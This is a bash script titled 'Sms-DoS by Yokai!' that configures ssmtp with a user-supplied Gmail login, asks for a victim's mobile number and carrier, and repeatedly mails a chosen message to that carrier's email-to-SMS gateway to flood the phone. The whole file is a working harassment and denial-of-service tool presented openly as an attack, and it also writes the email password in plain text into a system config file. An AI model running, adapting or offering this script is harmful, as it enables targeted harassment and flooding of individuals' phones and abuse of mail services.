#!/bin/bash

clear
test "$(whoami)" != 'root' && (echo YOU MUST BE ROOT TO RUN THIS SCRIPT; exit 1)
IP=`ifconfig | grep 'inet addr:'| grep -v '127.0.0.1' | cut -d: -f2 | awk '{ print $1}'`
if [ -z $IP ]; then
clear;echo;echo;echo " YOU MUST BE CONNECTED TO THE INTERNET TO RUN SCRIPT"
exit 1
fi

echo;echo;echo " Sms-DoS by Yokai!"
sleep 3

clear;echo;echo;

echo -n " ENTER THE EMAIL ADDRESS YOU WISH TO USE: "
read AuthUser
echo;echo;
echo -n " ENTER THE EMAIL ADDRESS PASSWORD: "
read AuthPass
clear;echo;echo;echo " NOW SETTING UP CONFIG FILE WITH DATA"

echo "AuthUser=$AuthUser" >> /etc/ssmtp/ssmtp.conf
echo "AuthPass=$AuthPass" >> /etc/ssmtp/ssmtp.conf
echo "FromLineOverride=YES" >> /etc/ssmtp/ssmtp.conf
echo "mailhub=smtp.gmail.com:587" >> /etc/ssmtp/ssmtp.conf
echo "useSTARTTLS=YES" >> /etc/ssmtp/ssmtp.conf

echo;echo;echo;echo "INITIAL SETUP IS COMPLETE ... SETTING UP THE ATTACK! "
sleep 3
clear;echo -n "ENTER VICTIM'S MOBILE NUMBER: "
read NUM

echo;echo;

PS3="Choose (1-10):"
echo ""
echo "CHOOSE A CARRIER BELOW"
echo "----------------------"
select CARRIER in ATT BOOST VERIZON VIRGIN ALLTELL SPRINT TMOBILE TRACFONE CINGULAR CORRWIRELESS
do
break
done

ATT=@txt.att.net
BOOST=@myboostmobile.com
VERIZON=@vtext.com
VIRGIN=@vmobl.com
ALLTELL=@message.alltel.com
SPRINT=@messaging.sprintpcs.com
TMOBILE=@tmomail.net
TRACFONE=@txt.att.net
CINGULAR=@txt.att.net
CORRWIRELESS=@corrwireless.net

NUMBER=${NUM}@txt.att.net

case $CARRIER in
ATT)
NUMBER=${NUM}@txt.att.net
;;
BOOST)
NUMBER=${NUM}@myboostmobile.com
;;
VERIZON)
NUMBER=${NUM}@vtext.com
;;
VIRGIN)
NUMBER=${NUM}@vmobl.com
;;
ALLTELL)
NUMBER=${NUM}@message.alltel.com
;;
SPRINT)
NUMBER=${NUM}@messaging.sprintpcs.com
;;
TMOBILE)
NUMBER=${NUM}@tmomail.net
;;
TRACFONE)
NUMBER=${NUM}@txt.att.net
;;
CINGULAR)
NUMBER=${NUM}@txt.att.net
;;
CORRWIRELESS)
NUMBER=${NUM}@corrwireless.net
;;

*)
;;
esac
echo;echo;
echo -n "ENTER SUBJECT (BLANK FOR NO SUBJECT): "
read SUBJECT
echo;echo;
echo " USING $CARRIER ";sleep 1;echo;echo
echo -n "ENTER A SHORT MESSAGE: "
read MESSAGE

echo;echo;

echo -n "ATTACKING $NUMBER ";echo;
echo -n "CONTINUE? (Y/N): )"
read NEXT

if [ $NEXT = n ];then
echo "RESTARTING";echo;echo;
./smskiller.sh
elif [ "$NEXT" = y ];then
echo $MESSAGE > 1.txt
echo "HOW MANY MESSAGES DO YOU WANNA SEND?: "
read SMS
echo;echo
echo "NUMBER OF SECONDS BETWEEN MESSAGES?: "
read SPEED
COUNTER=0
until [ $SMS -le $COUNTER ];do
cat 1.txt | mail -s "$SUBJECT" $NUMBER
sleep $SPEED
COUNTER=$(( $COUNTER + 1 ))
echo "CTRL + C TO CALL OFF ATTACK ... "
done
fi
